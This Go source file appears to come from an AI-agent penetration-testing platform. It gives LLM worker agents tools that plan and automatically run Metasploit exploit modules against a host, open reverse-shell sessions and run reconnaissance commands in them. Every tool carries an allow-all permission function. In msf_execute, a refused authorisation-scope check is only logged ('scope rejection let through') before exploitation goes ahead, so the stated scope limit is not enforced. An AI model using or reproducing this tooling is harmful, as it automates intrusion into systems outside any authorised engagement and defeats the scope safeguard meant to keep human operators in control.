package server

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/agent"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/msf"
	"github.com/Autumn-27/artex/msfrpc"
	"github.com/Autumn-27/norma/llm"
	"github.com/Autumn-27/norma/permission"
	actool "github.com/Autumn-27/norma/tool"
)

type msfArgs struct {
	VulnClass string `json:"vuln_class"`
	Product   string `json:"product"`
	Version   string `json:"version"`
	Host      string `json:"host"`
	Port      int    `json:"port"`
	Service   string `json:"service"`
	URL       string `json:"url"`
	SSL       *bool  `json:"ssl"`
	LHOST     string `json:"lhost"`
	LPORT     int    `json:"lport"`
	OS        string `json:"os"`
	Username  string `json:"username"`
	Password  string `json:"password"`
}

func (a msfArgs) input() msf.Input {
	return msf.Input{
		VulnClass: a.VulnClass, Product: a.Product, Version: a.Version,
		Host: a.Host, Port: a.Port, Service: a.Service, URL: a.URL,
		SSL: a.SSL, LHOST: a.LHOST, LPORT: a.LPORT,
		OS: a.OS, Username: a.Username, Password: a.Password,
	}
}

func msfSchema() map[string]any {
	str := func(desc string) map[string]any { return map[string]any{"type": "string", "description": desc} }
	return map[string]any{
		"type": "object",
		"properties": map[string]any{
			"vuln_class": str("漏洞类别/产品/CVE（如 struts2、log4j、eternalblue、weblogic、redis 未授权）"),
			"product":    str("目标产品名（可选，辅助归一化）"),
			"version":    str("产品版本（可选）"),
			"host":       str("目标主机 IP/域名（必填）"),
			"port":       map[string]any{"type": "integer", "description": "目标端口（缺省按 service/URL 推断）"},
			"service":    str("服务名（http/https/ssh/smb/rdp/redis…）"),
			"url":        str("目标 URL（用于推导 TARGETURI 与 SSL）"),
			"ssl":        map[string]any{"type": "boolean", "description": "是否 HTTPS（缺省按 443/https URL 推断）"},
			"lhost":      str("反弹 payload 的回连地址（内网渗透时为平台可达地址）"),
			"lport":      map[string]any{"type": "integer", "description": "回连端口，默认 4444"},
			"os":         str("目标操作系统 windows/linux/auto（可选；原生 exploit 据此选 PAYLOAD，Web 载体模块不写 PAYLOAD）"),
			"username":   str("目标凭据用户名（可选，用于 tomcat_mgr_upload 等需要登录的模块，写入 HttpUsername）"),
			"password":   str("目标凭据密码（可选，写入 HttpPassword）"),
		},
		"required": []any{"host"},
	}
}

func (s *Server) msfTools() []actool.CoreTool {
	return []actool.CoreTool{s.msfPlanTool(), s.msfNextTool(), s.msfExecuteTool(), s.autopwnTool()}
}

func (s *Server) seedMSFTools() {
	workerAgents, _ := json.Marshal([]string{"worker"})
	for _, t := range s.msfTools() {
		schema, _ := json.Marshal(t.InputSchema())
		if err := s.m.PG().SeedTool(t.Name(), t.Description(), schema, workerAgents); err != nil {
			log.Printf("[tools] seed %s 失败： %v", t.Name(), err)
		}
	}
}

func allowAll(context.Context, json.RawMessage, permission.Context) permission.Decision {
	return permission.Allowed()
}

func (s *Server) msfPlanTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "msf_plan",
		Description: "【Metasploit 决策层·只读】按漏洞类别/目标给出确定性的利用计划：候选模块（按置信度排序）、" +
			"每个模块的 RHOSTS/RPORT/TARGETURI/PAYLOAD 等参数、执行前置条件、失败分支与拿会话后的取证步骤。" +
			"同一输入永远得到同一 plan_id 与同一顺序，不受模型随机性影响。执行请用 msf_execute（自动跑完候选链）" +
			"或按计划手工调 MCP 工具（use_module/set_module_option/execute_module/list_sessions）。",
		Schema:      msfSchema(),
		ReadOnly:    func(json.RawMessage) bool { return true },
		Permissions: allowAll,
		Run: func(_ context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a msfArgs
			_ = json.Unmarshal(in, &a)
			plan, err := msf.Build(a.input())
			if err != nil {
				return msfPlanError(err)
			}
			return jsonResult(map[string]any{
				"plan": plan,
				"next": "按 candidates 顺序执行；每次尝试后用 msf_next(attempt=i, outcome=session|no_session|error|module_missing|precheck_failed) 取下一步。",
			})
		},
	})
}

func (s *Server) msfNextTool() actool.CoreTool {
	schema := msfSchema()
	schema["properties"].(map[string]any)["attempt"] = map[string]any{
		"type": "integer", "description": "刚尝试的候选下标（0-based，对应 plan.candidates[i].order-1）",
	}
	schema["properties"].(map[string]any)["outcome"] = map[string]any{
		"type": "string", "enum": []any{"session", "no_session", "error", "module_missing", "precheck_failed"},
		"description": "本次尝试的观察结果",
	}
	schema["required"] = []any{"host", "outcome"}
	return actool.Build(actool.Spec{
		Name: "msf_next",
		Description: "【Metasploit 决策层·只读】给定同一目标与本次尝试结果，返回确定性的下一步：" +
			"retry（换下一候选）/ session（拿会话，给出取证步骤）/ degrade（前置条件不满足，转验证）/ stop（候选耗尽，写否定 fact）。" +
			"无状态：同一输入+attempt+outcome 永远得到同一动作。",
		Schema:      schema,
		ReadOnly:    func(json.RawMessage) bool { return true },
		Permissions: allowAll,
		Run: func(_ context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				msfArgs
				Attempt int    `json:"attempt"`
				Outcome string `json:"outcome"`
			}
			_ = json.Unmarshal(in, &a)
			plan, err := msf.Build(a.input())
			if err != nil {
				return msfPlanError(err)
			}
			act := msf.Next(plan, a.Attempt, msf.Outcome(a.Outcome))
			return jsonResult(map[string]any{"plan_id": plan.PlanID, "action": act})
		},
	})
}

func msfPlanError(err error) (actool.Result, error) {
	if np, ok := err.(*msf.ErrNoPlan); ok {
		return jsonResult(map[string]any{
			"kind":             "search",
			"suggested_search": np.Search,
			"message":          np.Message,
		})
	}
	return actool.Errorf(err.Error()), nil
}

// msfSession is one authenticated msfrpcd connection plus its endpoint.
type msfSession struct {
	client *msfrpc.Client
	host   string
	port   int
	ssl    bool
}

func (m *msfSession) Close() { m.client.Close() }

// sessionIDs snapshots the live session ids so a later poll can diff them.
func (m *msfSession) sessionIDs(ctx context.Context) map[string]bool {
	out := map[string]bool{}
	list, err := m.client.Sessions(ctx)
	if err != nil {
		return out
	}
	for id := range list {
		out[id] = true
	}
	return out
}

func resultText(r actool.Result) string {
	var b strings.Builder
	for _, c := range r.Content {
		if c.Type == llm.BlockText {
			b.WriteString(c.Text)
		}
	}
	return b.String()
}

func truncateForTool(s string) string {
	const max = 500
	if len(s) <= max {
		return s
	}
	return s[:max] + "…"
}

// msfConnect dials msfrpcd and authenticates, trying both transport modes
// unless the caller pinned one. Everything below it speaks msfrpc directly:
// no MCP server, no Python interpreter, no external package.
func (s *Server) msfConnect(ctx context.Context, password, sslMode string) (*msfSession, error) {
	if password == "" {
		return nil, fmt.Errorf("msfrpcd 需要密码：传 rpc_password，或设置 ARTEX_MSF_RPC_PASSWORD / 设置项 msf_rpc_password")
	}
	host, port := s.msfRPCAddrPort()

	modes := []bool{false, true}
	switch strings.ToLower(strings.TrimSpace(sslMode)) {
	case "true", "1", "yes", "ssl":
		modes = []bool{true}
	case "false", "0", "no", "plain":
		modes = []bool{false}
	}
	// An ARTEX-managed msfrpcd is started with -S (plaintext); trying TLS first
	// would only add a failed handshake to every call.
	if s.msfRPC != nil && s.msfRPC.Plaintext() {
		modes = []bool{false}
	}

	var lastErr error
	for _, ssl := range modes {
		cl := msfrpc.New(msfrpc.Options{Host: host, Port: port, SSL: ssl})
		if err := cl.Login(ctx, "msf", password); err != nil {
			cl.Close()
			lastErr = err
			continue
		}
		return &msfSession{client: cl, host: host, port: port, ssl: ssl}, nil
	}
	return nil, fmt.Errorf("连接 msfrpcd %s:%d 失败（已尝试 ssl=%v）：%v", host, port, modes, lastErr)
}

func diffSessions(before, after map[string]bool) []string {
	var out []string
	for id := range after {
		if !before[id] {
			out = append(out, id)
		}
	}
	sort.Strings(out)
	return out
}

func (s *Server) msfExecuteTool() actool.CoreTool {
	schema := msfSchema()
	props := schema["properties"].(map[string]any)
	props["rpc_password"] = map[string]any{"type": "string", "description": "msfrpcd 密码（缺省读 ARTEX_MSF_RPC_PASSWORD / 设置项 msf_rpc_password）"}
	props["rpc_ssl"] = map[string]any{"type": "string", "enum": []any{"auto", "true", "false"},
		"description": "msfrpcd 是否 SSL：auto=先试 SSL 再回退明文（默认，兼容默认 msfrpcd 与 -S 启动）"}
	props["max_candidates"] = map[string]any{"type": "integer", "description": "最多尝试几个候选，默认 3（上限 8）"}
	props["verify_session_seconds"] = map[string]any{"type": "integer", "description": "执行后等待新会话的秒数，默认 25（上限 120）"}
	return actool.Build(actool.Spec{
		Name: "msf_execute",
		Description: "【Metasploit 全自动闭环】按决策层候选链自动执行：连接已启用的 metasploit MCP → use_module → 设置参数 → " +
			"execute_module → 轮询 list_sessions 判断是否拿到新会话；无会话自动切下一候选，拿到会话即返回 session id 与取证步骤。" +
			"只应在已完成漏洞验证、目标在授权 scope 内时使用；执行前会检查模块存在性与前置端口。返回 transcript 供写回 fact。",
		Schema:      schema,
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: allowAll,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				msfArgs
				RPCPassword string `json:"rpc_password"`
				RPCSsl      string `json:"rpc_ssl"`
				MaxCands    int    `json:"max_candidates"`
				WaitSecs    int    `json:"verify_session_seconds"`
			}
			_ = json.Unmarshal(in, &a)
			if a.MaxCands <= 0 || a.MaxCands > 8 {
				a.MaxCands = 3
			}
			if a.WaitSecs <= 0 || a.WaitSecs > 120 {
				a.WaitSecs = 25
			}
			plan, err := msf.Build(a.input())
			if err != nil {
				return msfPlanError(err)
			}
			if len(plan.Candidates) == 0 {
				return actool.Errorf("没有候选模块"), nil
			}
			if ok, why := s.msfScopeAllows(ctx, a.Host); !ok {
				log.Printf("[msf] scope 拒绝已放行：%s", why)
			}

			pw := a.RPCPassword
			if pw == "" {
				pw = os.Getenv("ARTEX_MSF_RPC_PASSWORD")
			}
			if pw == "" && s.m != nil && s.m.pg != nil {
				pw, _, _ = s.m.pg.GetSetting("msf_rpc_password")
			}
			if pw == "" && s.msfRPC != nil {
				pw = s.msfRPC.Password()
			}
			sslMode := a.RPCSsl
			if sslMode == "" {
				sslMode = os.Getenv("ARTEX_MSF_RPC_SSL")
			}

			sess, err := s.msfConnect(ctx, pw, sslMode)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			defer sess.Close()

			before := sess.sessionIDs(ctx)

			lp := a.LPORT
			if lp == 0 {
				lp = 4444
			}
			transcript := make([]map[string]any, 0, a.MaxCands*4)
			act := msf.Action{}
			var got []string
			attempted := 0
			for i, c := range plan.Candidates {
				if i >= a.MaxCands {
					break
				}
				attempted = i + 1
				if _, err := sess.client.ModuleInfo(ctx, c.ModuleType, c.Module); err != nil {
					transcript = append(transcript, map[string]any{"candidate": i, "module": c.Module, "step": "module_missing", "detail": err.Error()})
					act = msf.Next(plan, i, msf.OutcomeModuleMissing)
					continue
				}
				execTxt, execErr := sess.runCandidate(ctx, c, lp, a.WaitSecs)
				entry := map[string]any{"candidate": i, "module": c.Module, "payload": c.Payload, "step": "execute"}
				if execErr != nil {
					entry["error"] = execErr.Error()
				} else {
					entry["result"] = truncateForTool(execTxt)
				}
				transcript = append(transcript, entry)
				if execErr != nil {
					act = msf.Next(plan, i, msf.OutcomeError)
					continue
				}
				got = waitNewSessions(ctx, sess, before, a.WaitSecs)
				if len(got) > 0 {
					act = msf.Next(plan, i, msf.OutcomeSession)
					evidence := ""
					for _, sid := range got {
						if ev := s.msfSessionEvidence(ctx, sess, sid); ev != "" {
							evidence += fmt.Sprintf("[session %s]\n%s\n", sid, ev)
						}
					}
					s.msfRecordSessionFact(ctx, plan, got[0], evidence)
					transcript = append(transcript, map[string]any{
						"step": "session", "ids": got, "evidence": truncateForTool(evidence),
					})
					break
				}
				act = msf.Next(plan, i, msf.OutcomeNoSession)
				transcript = append(transcript, map[string]any{"step": "no_session", "candidate": i})
			}
			after := sess.sessionIDs(ctx)
			return jsonResult(map[string]any{
				"plan_id":      plan.PlanID,
				"attempted":    attempted,
				"sessions":     got,
				"all_sessions": keysOf(after),
				"action":       act,
				"transcript":   transcript,
				"note":         "拿到 session 后先按 action.post_steps 取证，再写回 fact；没有会话按 action 处理（retry/degrade/stop），不要重复同一候选。",
			})
		},
	})
}

func waitNewSessions(ctx context.Context, sess *msfSession, before map[string]bool, seconds int) []string {
	deadline := time.Now().Add(time.Duration(seconds) * time.Second)
	for {
		if got := diffSessions(before, sess.sessionIDs(ctx)); len(got) > 0 {
			return got
		}
		if time.Now().After(deadline) {
			return nil
		}
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(2 * time.Second):
		}
	}
}

func keysOf(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

func (s *Server) msfScopeAllows(ctx context.Context, host string) (bool, string) {
	if s.m == nil || s.m.pg == nil {
		return true, ""
	}
	ri := agent.RunInfoFrom(ctx)
	if ri.TaskID == 0 {
		return true, "非任务上下文"
	}
	rows, err := s.m.pg.Assets().ListTaskScope(ri.TaskID)
	if err != nil {
		return false, "读取任务 scope 失败：" + err.Error()
	}
	if len(rows) == 0 {
		return true, "任务未登记 scope（bootstrap）"
	}
	if scopeRowsAllow(rows, host) {
		return true, ""
	}
	return false, "目标 " + host + " 不在任务授权 scope 内"
}

func scopeRowsAllow(rows []db.TaskScope, host string) bool {
	h := normalizeScopeTarget(host)
	if h == "" {
		return true
	}
	ip := net.ParseIP(h)
	for _, r := range rows {
		switch r.Kind {
		case "ip":
			for _, v := range []string{r.Value, r.Net, r.Domain} {
				v = strings.TrimSpace(v)
				if v == "" {
					continue
				}
				if _, n, err := net.ParseCIDR(v); err == nil {
					if ip != nil && n.Contains(ip) {
						return true
					}
					continue
				}
				if normalizeScopeTarget(v) == h {
					return true
				}
			}
		case "cidr":
			if ip == nil {
				continue
			}
			for _, v := range []string{r.Net, r.Value} {
				if _, n, err := net.ParseCIDR(strings.TrimSpace(v)); err == nil && n.Contains(ip) {
					return true
				}
			}
		case "root_domain", "subdomain":
			d := strings.ToLower(strings.TrimSpace(r.Domain))
			if d != "" && (h == d || strings.HasSuffix(h, "."+d)) {
				return true
			}
		}
	}
	return false
}

func normalizeScopeTarget(v string) string {
	v = strings.TrimSpace(v)
	if v == "" {
		return ""
	}
	if i := strings.Index(v, "://"); i >= 0 {
		v = v[i+3:]
	}
	if i := strings.IndexAny(v, "/?#"); i >= 0 {
		v = v[:i]
	}
	if h, _, err := net.SplitHostPort(v); err == nil {
		v = h
	}
	return strings.TrimSuffix(strings.ToLower(v), ".")
}

func (m *msfSession) createConsole(ctx context.Context) (int, error) {
	return m.client.ConsoleCreate(ctx)
}

func (m *msfSession) runCandidate(ctx context.Context, c msf.Candidate, lport, seconds int) (string, error) {
	cid, err := m.createConsole(ctx)
	if err != nil {
		return m.execDirect(ctx, c, lport)
	}
	defer func() { _ = m.client.ConsoleDestroy(ctx, cid) }()

	var script strings.Builder
	fmt.Fprintf(&script, "use %s\n", c.Module)
	keys := make([]string, 0, len(c.Options))
	for k := range c.Options {
		if k == "PAYLOAD" {
			continue
		}
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		fmt.Fprintf(&script, "set %s %s\n", k, c.Options[k])
	}
	if c.Payload != "" {
		fmt.Fprintf(&script, "set PAYLOAD %s\n", c.Payload)
	}
	if lport > 0 {
		fmt.Fprintf(&script, "set LPORT %d\n", lport)
	}
	script.WriteString("run -j\n")
	if err := m.client.ConsoleWrite(ctx, cid, script.String()); err != nil {
		return "", err
	}

	deadline := time.Now().Add(time.Duration(seconds) * time.Second)
	var out strings.Builder
	for {
		data, busy, err := m.client.ConsoleRead(ctx, cid)
		if err == nil {
			if data != "" {
				out.WriteString(data)
			}
			low := strings.ToLower(out.String())
			if strings.Contains(low, "session") && !busy {
				break
			}
		}
		if time.Now().After(deadline) {
			break
		}
		select {
		case <-ctx.Done():
			return out.String(), ctx.Err()
		case <-time.After(2 * time.Second):
		}
	}
	return out.String(), nil
}

// execDirect is the console-less fallback: module.execute only carries the core
// options, so TARGETURI-style parameters are lost when a console is unavailable.
func (m *msfSession) execDirect(ctx context.Context, c msf.Candidate, lport int) (string, error) {
	opts := map[string]any{}
	for _, k := range []string{"RHOSTS", "RPORT", "LHOST", "SSL", "TARGETURI"} {
		if v, ok := c.Options[k]; ok && v != "" {
			opts[k] = v
		}
	}
	if c.Payload != "" {
		opts["PAYLOAD"] = c.Payload
	}
	if lport > 0 {
		opts["LPORT"] = lport
	}
	res, err := m.client.ModuleExecute(ctx, c.ModuleType, c.Module, opts)
	if err != nil {
		return "", err
	}
	if job, ok := res["job_id"]; ok {
		return fmt.Sprintf(`{"job_id":%v,"uuid":"%v"}`, job, res["uuid"]), nil
	}
	return fmt.Sprint(res), nil
}

func (s *Server) msfSessionEvidence(ctx context.Context, sess *msfSession, id string) string {
	cmds := []string{"whoami", "hostname", "ipconfig"}
	var last string
	for attempt := 0; attempt < 8; attempt++ {
		select {
		case <-time.After(1500 * time.Millisecond):
		case <-ctx.Done():
			return last
		}
		for _, cmd := range cmds {
			out, err := sess.runSessionCommand(ctx, id, cmd)
			if err != nil {
				continue
			}
			if out = strings.TrimSpace(out); out != "" {
				last = out
				return out
			}
		}
	}
	log.Printf("[msf] 会话 %s 取证为空（连续 8 轮无输出）", id)
	return last
}

// runSessionCommand picks the write/read pair that matches the session kind.
// Shells need CRLF-terminated lines on Windows targets, so both forms are sent
// for shell sessions (an extra blank line is harmless on Linux).
func (m *msfSession) runSessionCommand(ctx context.Context, id, cmd string) (string, error) {
	sessions, err := m.client.Sessions(ctx)
	if err != nil {
		return "", err
	}
	s, ok := sessions[id]
	if !ok {
		return "", fmt.Errorf("会话 %s 已不存在", id)
	}
	if s.Type == "meterpreter" {
		return m.client.SessionCommand(ctx, id, s.Type, cmd)
	}
	return m.client.SessionCommand(ctx, id, "shell", cmd+"\r\n")
}

func (s *Server) msfRecordSessionFact(ctx context.Context, plan msf.Plan, sessionID, evidence string) {
	if s.m == nil || s.m.pg == nil {
		return
	}
	ri := agent.RunInfoFrom(ctx)
	if ri.TaskID <= 0 {
		return
	}
	task, ok := s.m.Task(strconv.FormatInt(ri.TaskID, 10))
	if !ok || task == nil || task.Store == nil {
		return
	}
	host := ""
	if len(plan.Candidates) > 0 {
		host = plan.Candidates[0].Options["RHOSTS"]
	}
	if len(evidence) > 4000 {
		evidence = evidence[:4000] + "…[截断]"
	}
	payload := map[string]any{
		"summary":        fmt.Sprintf("MSF 会话建立：session %s（%s，目标 %s）", sessionID, plan.Class, host),
		"evidence":       evidence,
		"confidence":     "confirmed",
		"msf_session_id": sessionID,
		"msf_plan_id":    plan.PlanID,
		"msf_host":       host,
	}
	if _, err := task.Store.AddNode(db.KindFact, payload, 0, "confirmed", "worker", nil); err != nil {
		log.Printf("[msf] 写回会话 fact 失败：%v", err)
		return
	}
	task.Notify()
	log.Printf("[msf] 会话 %s 已写回 fact（任务 %d，%s）", sessionID, ri.TaskID, plan.Class)
}
